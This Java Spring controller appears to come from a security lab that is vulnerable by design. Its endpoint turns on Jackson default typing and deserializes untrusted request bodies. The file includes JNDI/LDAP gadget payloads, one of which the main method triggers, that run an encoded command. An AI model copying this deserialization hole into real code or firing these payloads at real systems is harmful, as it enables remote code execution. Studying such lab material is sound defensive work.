package com.l4yn3.microserviceseclab.controller;

import com.alibaba.fastjson.JSON;
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.l4yn3.microserviceseclab.data.Teacher;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
@RestController
@RequestMapping(value = "/jackjson")
public class JacksonController {
    @PostMapping(value = "/create")
    public void createActivity(@RequestBody String applyData,
                                  HttpServletRequest request, HttpServletResponse response) throws JsonProcessingException {
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();

//        String json = "[\"org.apache.xbean.propertyeditor.JndiConverter\", {\"asText\":\"ldap://127.0.0.1:1389/TomcatBypass/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9y\"}]";
        mapper.readValue(applyData, Object.class);
    }

    public static void main(String[] args) throws JsonProcessingException {
//        ObjectMapper mapper = new ObjectMapper();
//        mapper.enableDefaultTyping();
//
//        String json = "[\"org.springframework.beans.factory.config.BeanReferenceFactoryBean\", {\"targetBeanName\": \"ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9y\",\"beanFactory\":[\"org.springframework.jndi.support.SimpleJndiBeanFactory\", {\"shareableResources\":[\"127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9y\"]}]}]";
//        Object o = mapper.readValue(json, Object.class);
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();

        String json = "[\"org.apache.xbean.propertyeditor.JndiConverter\", {\"asText\":\"ldap://127.0.0.1:1389/TomcatBypass/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9y\"}]";
        mapper.readValue(json, Object.class);
    }

}